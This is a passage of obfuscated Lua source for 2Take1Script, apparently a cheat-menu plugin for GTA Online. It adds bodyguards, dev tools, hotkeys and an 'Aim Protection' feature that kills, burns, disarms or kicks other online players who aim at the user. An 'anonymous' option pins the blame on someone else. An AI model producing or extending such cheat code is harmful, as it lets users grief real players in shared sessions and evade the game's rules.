        function(aO)
        end
    )
    al["range_start"].max_i = 8550
    al["range_start"].mod_i = 50
    al["range_end"] =
        aH(
        "Select ending line for range",
        "action_value_i",
        U["ipl_config"],
        function(aO)
        end
    )
    al["range_end"].max_i = 8550
    al["range_end"].mod_i = 50
    al["remove_ipls"] =
        aF(
        "Remove ALL IPLs between selected Range",
        U["ipl_config"],
        function()
            local bs = 0
            local dW = al["range_start"].value_i
            for dV in io.lines(a .. "\\2Take1IPLlist.txt") do
                if bs == dW then
                    dW = dW + 1
                    if dW <= al["range_end"].value_i then
                        streaming.remove_ipl(dV)
                    end
                end
                bs = bs + 1
            end
        end
    )
    U["debug"] = aC("Dev Tools", U["misc"]).id
    aF(
        "Delete Entity from Aim",
        U["debug"],
        function()
            b1({player.get_entity_player_is_aiming_at(aV())})
        end
    )
    aF(
        "Get input Hash Key",
        U["debug"],
        function()
            local cb
            local aQ, dX = input.get("Enter Name(PED, OBJECT, etc)", "", 64, 0)
            while aQ == 1 do
                system.wait(0)
                aQ, dX = input.get("Enter Name(PED, OBJECT, etc)", "", 64, 0)
            end
            if aQ == 2 then
                return HANDLER_POP
            end
            n("")
            n("******************************")
            n("String: " .. dX)
            cb = tostring(gameplay.get_hash_key(dX))
            n("Hash: " .. cb)
            k(string.format("%s %s", dX, cb))
        end
    )
    aF(
        "Notify & Print String from file",
        U["debug"],
        function()
            local dY = "slod_small_quadped"
            local dZ = gameplay.get_hash_key(dY)
            n("")
            n("******************************")
            n("String: " .. dY)
            n("Hash: " .. dZ)
            k("String: " .. dY)
            k("Hash: " .. dZ)
        end
    )
    V["print_info_from_entity"] =
        aF(
        "Print Info from Entity @Aim to file",
        U["debug"],
        function()
            local cY = player.get_entity_player_is_aiming_at(aV())
            local d_, bc, d2
            if cY ~= 0 then
                while cY ~= 0 do
                    d_ = entity.get_entity_model_hash(cY)
                    bc = entity.get_entity_coords(cY)
                    d2 = entity.get_entity_rotation(cY)
                    n("")
                    n("Printing infos about Entity:")
                    n("******************************")
                    n("Hash: " .. d_)
                    n("Entity: " .. cY)
                    n("Coords X: " .. bc.x)
                    n("Coords Y: " .. bc.y)
                    n("Coords Z: " .. bc.z)
                    n("Rot X: " .. d2.x)
                    n("Rot Y: " .. d2.y)
                    n("Rot Z: " .. d2.z)
                    n("Heading: " .. entity.get_entity_heading(cY))
                    n("Entity Type: " .. entity.get_entity_type(cY))
                    if entity.is_entity_a_ped(cY) then
                        n("Entity is a PED")
                    elseif entity.is_entity_a_vehicle(cY) then
                        n("Entity is a VEHICLE")
                    elseif entity.is_entity_an_object(cY) then
                        n("Entity is a OBJECT")
                    end
                    if entity.is_entity_dead(cY) then
                        n("Entity is DEAD")
                    end
                    if entity.is_entity_on_fire(cY) then
                        n("Entity is ON FIRE")
                    end
                    if entity.is_entity_visible(cY) then
                        n("Entity is VISIBLE")
                    else
                        n("Entity is INvisible")
                    end
                    if entity.is_entity_attached(cY) then
                        cY = entity.get_entity_attached_to(cY)
                        n("")
                        n("Attached Entity found. Continue printing infos of Entity.")
                        n("Attached Entity Info:")
                    else
                        cY = 0
                        n("")
                        n("")
                        n("")
                    end
                end
                k("Printed Info about Entity to file.")
            else
                k("Nothing found for Info-Printing.")
            end
        end
    )
    aF(
        "Clear 2Take1Script.log",
        U["debug"],
        function()
            local f = io.open(a .. "\\2Take1Script.log", "w")
            io.close(f)
            k("Cleared 2Take1Script.log", 204)
            n("Cleared 2Take1Script.log")
        end
    )
    aF(
        "Clear Menu Log-Files",
        U["debug"],
        function()
            local e0 = os.getenv("APPDATA") .. "\\PopstarDevs\\"
            local f = io.open(e0 .. "PopstarAuth.log", "w")
            io.close(f)
            k("Cleared PopstarAuth.log", 204)
            n("Cleared PopstarAuth.log")
            e0 = e0 .. "2Take1Menu\\"
            f = io.open(e0 .. "2Take1Menu.log", "w")
            io.close(f)
            k("Cleared 2Take1Menu.log", 204)
            n("Cleared 2Take1Menu.log")
            f = io.open(e0 .. "2Take1Prep.log", "w")
            io.close(f)
            k("Cleared 2Take1Prep.log", 204)
            n("Cleared 2Take1Prep.log")
        end
    )
    aF(
        "Clear crashdumps",
        U["debug"],
        function()
            local e0 = os.getenv("APPDATA") .. "\\PopstarDevs\\2Take1Menu\\crashdump"
            local e1 = utils.get_all_files_in_directory(e0, "dump")
            if e1[1] ~= nil then
                k("Found dumps, deleting...", 204)
                for E = 1, #e1 do
                    os.remove(e0 .. "\\" .. e1[E])
                end
                k("Cleared crashdumps.", 204)
                n("Cleared crashdumps.")
            else
                k("No dumps found.", 204)
            end
        end
    )
    V["logger"] =
        aG(
        "Enable Log from this Lua-Script",
        U["debug"],
        function(aO)
            h["logger"] = aO.on
        end
    )
    V["logger"].on = h["logger"]
    U["bodyguards"] = aC("Bodyguards", U["parent"])
    U["bodyguards"].hidden = h["bodyguards_hidden"]
    U["bodyguards"] = U["bodyguards"].id
    V["bodyguards_god"] =
        aG(
        "Godmode for Bodyguards",
        U["bodyguards"],
        function(aO)
            h["bodyguards_god"] = aO.on
        end
    )
    V["bodyguards_god"].on = h["bodyguards_god"]
    V["bodyguards_health"] =
        aH(
        "Set Health of Bodyguards",
        "autoaction_value_i",
        U["bodyguards"],
        function(aO)
            k("Bodyguards Health set to: " .. aO.value_i)
            h["bodyguards_health"] = aO.value_i
        end
    )
    V["bodyguards_health"].min_i = 5000
    V["bodyguards_health"].max_i = 50000
    V["bodyguards_health"].mod_i = 5000
    V["bodyguards_health"].value_i = h["bodyguards_health"]
    V["bodyguards_equip_weapon"] =
        aG(
        "Equip Bodyguards with MG",
        U["bodyguards"],
        function(aO)
            h["bodyguards_equip_weapon"] = aO.on
        end
    )
    V["bodyguards_equip_weapon"].on = h["bodyguards_equip_weapon"]
    V["bodyguards_formation"] =
        aH(
        "Set Formation",
        "autoaction_value_i",
        U["bodyguards"],
        function(aO)
            h["bodyguards_formation_type"] = aO.value_i
        end
    )
    V["bodyguards_formation"].min_i = 0
    V["bodyguards_formation"].max_i = 3
    V["bodyguards_formation"].value_i = h["bodyguards_formation_type"]
    V["bodyguards"] =
        aG(
        "Enable Bodyguards",
        U["bodyguards"],
        function(aO)
            if aO.on then
                local e2 = player.get_player_group(aV())
                local cb = 0x613E626C
                for E = 1, 7 do
                    if T["bodyguards"][E] == nil or entity.is_entity_dead(T["bodyguards"][E]) then
                        if T["bodyguards"][E] ~= nil and entity.is_entity_dead(T["bodyguards"][E]) then
                            b1({T["bodyguards"][E]})
                        end
                        aR(cb)
                        T["bodyguards"][E] = ped.create_ped(29, cb, bP(a_(), aY(), 4), 0, true, false)
                        aT(cb)
                        if V["bodyguards_god"].on then
                            entity.set_entity_god_mode(T["bodyguards"][E], true)
                        else
                            ped.set_ped_max_health(T["bodyguards"][E], V["bodyguards_health"].value_i)
                            ped.set_ped_health(T["bodyguards"][E], V["bodyguards_health"].value_i)
                        end
                        local e3 = ui.add_blip_for_entity(T["bodyguards"][E])
                        ui.set_blip_sprite(e3, 310)
                        ui.set_blip_colour(e3, 80)
                        if V["bodyguards_equip_weapon"].on then
                            weapon.give_delayed_weapon_to_ped(T["bodyguards"][E], 0x22D8FE39, 0, 1)
                            weapon.give_delayed_weapon_to_ped(T["bodyguards"][E], 0xDBBD7280, 0, 1)
                        end
                        ped.set_ped_combat_ability(T["bodyguards"][E], 100)
                        ped.set_ped_as_group_member(T["bodyguards"][E], e2)
                        entity.set_entity_as_mission_entity(T["bodyguards"][E], 1, 1)
                    end
                    if not entity.is_entity_dead(T["bodyguards"][E]) then
                        aP(T["bodyguards"][E])
                        ped.set_group_formation(e2, V["bodyguards_formation"].value_i)
                        if player.is_player_free_aiming(aV()) then
                            local c4 = player.get_entity_player_is_aiming_at(aV())
                            if c4 ~= 0 then
                                ai.task_shoot_at_entity(T["bodyguards"][E], c4, 100, 0xC6EE6B4C)
                            else
                                local bc = a_()
                                local ds = cam.get_gameplay_cam_rot()
                                ds:transformRotToDir()
                                ds = ds * math.random(1, 50)
                                bc = bc + ds
                                ai.task_shoot_gun_at_coord(T["bodyguards"][E], bc, 100, 0xC6EE6B4C)
                            end
                        end
                        if b3(a_(), aZ(T["bodyguards"][E])) > 50 then
                            b0(T["bodyguards"][E], bP(a_(), aY(), -5))
                        end
                    end
                end
            end
            if not aO.on then
                b1(T["bodyguards"])
                T["bodyguards"] = {}
            end
            return aN(aO)
        end
    )
    U["aim_protection"] = aC("Aim Protection", U["parent"]).id
    V["enable_aim_prot"] =
        aG(
        "Enable Aim Protection",
        U["aim_protection"],
        function(aO)
            if aO.on then
                for E = 0, 31 do
                    if bv(E) then
                        local c4 = player.get_entity_player_is_aiming_at(E)
                        if c4 ~= 0 then
                            if c4 == aX() then
                                k(az(E) .. " is aiming at you!", 173)
                                local c8 = aX()
                                if h["anonymous_punishment"] then
                                    c8 = aW(E)
                                end
                                if h["aim_prot_ragdoll"] then
                                    k("Ragdolling " .. az(E) .. "!", 173)
                                    n("Ragdolling " .. az(E) .. "!")
                                    fire.add_explosion(aZ(aW(E)), 70, true, false, 1, c8)
                                    system.wait(100)
                                end
                                if h["aim_prot_fire"] then
                                    k("Setting " .. az(E) .. " on fire!", 173)
                                    n("Setting " .. az(E) .. " on fire!")
                                    fire.add_explosion(aZ(aW(E)), 3, true, false, 0, c8)
                                    system.wait(100)
                                end
                                if h["aim_prot_kill"] then
                                    k("Killing " .. az(E) .. "!", 173)
                                    n("Killing " .. az(E) .. "!")
                                    fire.add_explosion(aZ(aW(E)), 8, false, true, 0, c8)
                                    system.wait(100)
                                end
                                if h["aim_prot_remove_weapon"] then
                                    k("Removing Weapon from " .. az(E) .. "!", 173)
                                    n("Removing Weapon from " .. az(E) .. "!")
                                    ped.set_ped_can_switch_weapons(aW(E), false)
                                    weapon.remove_weapon_from_ped(aW(E), ped.get_current_ped_weapon(aW(E)))
                                    ped.set_ped_can_switch_weapons(aW(E), false)
                                    system.wait(100)
                                end
                                if h["aim_prot_kick"] then
                                    bw(false, E)
                                end
                            end
                        end
                    end
                end
            end
            h["enable_aim_prot"] = aO.on
            return aN(aO)
        end
    )
    V["enable_aim_prot"].on = h["enable_aim_prot"]
    V["anonymous_punishment"] =
        aG(
        "Anonymous Punishment",
        U["aim_protection"],
        function(aO)
            h["anonymous_punishment"] = aO.on
        end
    )
    V["anonymous_punishment"].on = h["anonymous_punishment"]
    V["aim_prot_ragdoll"] =
        aG(
        "Ragdoll Player",
        U["aim_protection"],
        function(aO)
            h["aim_prot_ragdoll"] = aO.on
        end
    )
    V["aim_prot_ragdoll"].on = h["aim_prot_ragdoll"]
    V["aim_prot_fire"] =
        aG(
        "Set on Fire",
        U["aim_protection"],
        function(aO)
            h["aim_prot_fire"] = aO.on
        end
    )
    V["aim_prot_fire"].on = h["aim_prot_fire"]
    V["aim_prot_kill"] =
        aG(
        "Kill Player",
        U["aim_protection"],
        function(aO)
            h["aim_prot_kill"] = aO.on
        end
    )
    V["aim_prot_kill"].on = h["aim_prot_kill"]
    V["aim_prot_remove_weapon"] =
        aG(
        "Remove Current Weapon",
        U["aim_protection"],
        function(aO)
            h["aim_prot_remove_weapon"] = aO.on
        end
    )
    V["aim_prot_remove_weapon"].on = h["aim_prot_remove_weapon"]
    V["aim_prot_kick"] =
        aG(
        "Kick Player",
        U["aim_protection"],
        function(aO)
            h["aim_prot_kick"] = aO.on
        end
    )
    V["aim_prot_kick"].on = h["aim_prot_kick"]
    U["opt"] = aC("Options", U["parent"])
    U["opt"].hidden = h["options_hidden"]
    U["opt"] = U["opt"].id
    U["hotkeys"] = aC("Hotkey Settings", U["opt"]).id
    V["enable_hotkeys"] =
        aG(
        "Enable Hotkeys",
        U["hotkeys"],
        function(aO)
            h["enable_hotkeys"] = aO.on
            if aO.on then
                if not utils.file_exists(a .. "\\2Take1Hotkeys.ini") then
                    local e4 = io.open(a .. "\\2Take1Hotkeys.ini", "w")
                    io.output(e4)
                    io.write("version=" .. h["version"] .. "\n")
                    for E = 1, #i do
                        io.write(i[E] .. "=" .. tostring(j[i[E]]) .. "\n")
                    end
                    io.write("################################\n")
                    io.write(
                        "#There are more valid Keys, but i wont list them. Currently its not supported to push 2 Keys for 1 Hotkey.\n"
                    )
                    io.write("#Example valid Hotkeys:\n")
                    io.write("#F1-F12\n")
                    io.write("#A-Z\n")
                    io.write("#LCONTROL\n")
                    io.write("#RSHIFT\n")
                    io.write("#Insert\n")
                    io.write("#Down\n")
                    io.write("#PageDown\n")
                    io.close(e4)
                    k(
                        "Created 2Take1Hotkeys.ini file in folder 2Take1Script. Edit Hotkeys and reload Hotkeys.ini file.",
                        86
                    )
                end
                for E = 1, #i do
                    local e5 = j[i[E]]
                    if e5 ~= nil then
                        local bV = MenuKey()
                        bV:push_str(e5)
                        if bV:is_down() then
                            system.wait(250)
                            local e6 = V[i[E]].name
                            n(e5 .. ":'" .. e6 .. "' got pressed.")
                            if h["hotkey_notification"] then
                                k(e5 .. ":'" .. e6 .. "' got pressed.", 86)
                            end
                            if V[i[E]].type == 512 then
                                V[i[E]].on = true
                                system.wait(100)
                                V[i[E]].on = false
                            else
                                if V[i[E]].on then
                                    V[i[E]].on = false
                                else
                                    V[i[E]].on = true
                                end
                            end
                        end
                    end
                end
            end
            return aN(aO)
        end
    )
    V["enable_hotkeys"].on = h["enable_hotkeys"]
    aF(
        "Reload 2Take1Hotkeys.ini",
        U["hotkeys"],
        function()
            W()
            k("Reloaded Hotkeys.ini", 86)
        end
    )
    V["hotkey_notification"] =
        aG(
        "Hotkey Notifications",
        U["hotkeys"],
        function(aO)
            h["hotkey_notification"] = aO.on
        end
    )
    V["hotkey_notification"].on = h["hotkey_notification"]
    aF(
        "Print active Hotkeys",
        U["hotkeys"],
        function()
            for E = 1, #i do
                local e5 = j[i[E]]
                if e5 ~= nil then
                    local e6 = V[i[E]].name
                    k(e5 .. ":'" .. e6 .. "'", 86)
                end
            end
        end
    )
    V["exclude_fr"] =
        aG(
        "Exclude Friends from Harmful Lobby Events",
        U["opt"],
        function(aO)
            h["exclude_fr"] = aO.on
        end
    )
    V["exclude_fr"].on = h["exclude_fr"]
    V["auto_get_in"] =
        aG(
        "Spawn in Custom Vehicle",
        U["opt"],
        function(aO)
            h["spawn_in_vehicle"] = aO.on
        end
    )
    V["auto_get_in"].on = h["spawn_in_vehicle"]
    V["use_own_veh"] =
        aG(
        "Use Own Vehicle for Custom ones",
        U["opt"],
        function(aO)
            h["use_own_veh"] = aO.on
        end
    )
    V["use_own_veh"].on = h["use_own_veh"]
    V["set_godmode"] =
        aG(
        "Godmode on Custom Vehicles",
        U["opt"],
        function(aO)
            h["set_godmode"] = aO.on
        end
    )
    V["set_godmode"].on = h["set_godmode"]
    V["attach_no_colision"] =
        aG(
        "Attached Entitys No Collision",
        U["opt"],
        function(aO)
            h["attach_no_colision"] = aO.on
        end
    )
    V["attach_no_colision"].on = h["attach_no_colision"]
    V["continuously_assassins"] =
        aG(
        "Continuously Assassin Peds",
        U["opt"],
        function(aO)
            h["continuously_assassins"] = aO.on
            if aO.on and #T["peds"] > 0 then
                if aA(ak) ~= -1 then
                    local c4 = aW(ak)
                    for E = 1, #T["peds"] do
                        ai.task_goto_entity(T["peds"][E], c4, 10, 500, 500)
                        ai.task_combat_ped(T["peds"][E], c4, 0, 16)
                    end
                end
            end
            return aN(aO)
        end
    )
    V["continuously_assassins"].on = h["continuously_assassins"]
    V["override_notify_color"] =
        aH(
        "Force Notification Color",
        "value_i",
        U["opt"],
        function(aO)
            h["override_notify_color"] = aO.on
            h["notify_color"] = aO.value_i
        end
    )
    V["override_notify_color"].max_i = 223
    V["override_notify_color"].on = h["override_notify_color"]
    V["override_notify_color"].value_i = h["notify_color"]
    aF(
        "Show Notification Color",
        U["opt"],
        function()
            k("Example Text\nNotification color: " .. h["notify_color"])
        end
    )
    V["2t1s_p"] =
        aG(
        "2Take1Script Parent",
        U["opt"],
        function(aO)
            h["2t1s_p"] = aO.on
        end
    )
    V["2t1s_p"].on = h["2t1s_p"]
    V["save_config"] =
        aF(
        "Save Configuration",
        U["opt"],
        function()
            local D = io.open(a .. "\\2Take1Script.ini", "w")
            io.output(D)
            for E = 1, #g do
                io.write(g[E] .. "=" .. tostring(h[g[E]]) .. "\n")
            end
            io.close(D)
            n("Saved Configuration to file.")
            k("Saved Configuration to file.", 25)
        end
    )
    n("")
    n("")
    n("Loaded 2Take1Script successfully. :)")
    n("")
    k("2Take1Script successfully loaded. :)", 210)
    _2t1s = true
end
cA()
